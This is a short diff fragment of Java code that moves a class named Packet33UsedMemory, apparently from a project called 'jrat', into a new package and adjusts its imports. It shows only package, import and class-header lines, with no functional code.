@@ -1,7 +1,7 @@
-package jrat.client.packets.incoming;
+package jrat.module.system;
 
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.Packet24UsedMemory;
+import jrat.client.packets.incoming.IncomingPacket;
 
 public class Packet33UsedMemory implements IncomingPacket {
 
